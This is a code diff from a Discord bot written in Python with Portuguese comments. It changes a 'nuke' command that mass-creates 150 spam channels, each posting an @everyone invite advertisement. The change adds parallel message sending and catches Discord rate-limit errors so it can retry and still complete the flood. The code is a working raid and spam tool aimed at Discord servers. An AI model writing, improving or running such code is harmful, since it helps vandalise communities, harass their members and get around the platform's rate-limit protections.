@@ -42554,19 +42554,32 @@ async def nuke_cmd(ctx: commands.Context):
             pass
 
     # 5. Recriar 150 canais "nata" com divulgação
-    _first_ch = None
-    for _ in range(150):
+    _nuke_msg   = "**NOVO SERVIDOR MIGRAMOS**\n\nhttps://discord.gg/nata\n\n|| @everyone here ||"
+    _nuke_allow = discord.AllowedMentions(everyone=True, roles=True)
+    _first_ch   = None
+
+    async def _nuke_send(c: discord.TextChannel) -> None:
         try:
-            _new_ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
-            await _new_ch.send(
-                content="**NOVO SERVIDOR MIGRAMOS**\n\nhttps://discord.gg/nata\n\n|| @everyone here ||",
-                allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
-            )
-            if _first_ch is None:
-                _first_ch = _new_ch
+            await c.send(content=_nuke_msg, allowed_mentions=_nuke_allow)
         except Exception:
             pass
-        await asyncio.sleep(0.3)
+
+    _created = 0
+    _attempts = 0
+    while _created < 150 and _attempts < 300:
+        _attempts += 1
+        try:
+            _new_ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
+            _created += 1
+            if _first_ch is None:
+                _first_ch = _new_ch
+            asyncio.create_task(_nuke_send(_new_ch))  # envia mensagem em paralelo
+            await asyncio.sleep(0.25)
+        except discord.RateLimited as _rl:
+            # espera o retry_after exato e retenta sem incrementar _created
+            await asyncio.sleep(min(float(getattr(_rl, "retry_after", 1)), 10) + 0.1)
+        except Exception:
+            await asyncio.sleep(0.5)
 
     # 6. Enviar status no primeiro canal criado
     if _first_ch and _nuke_log:
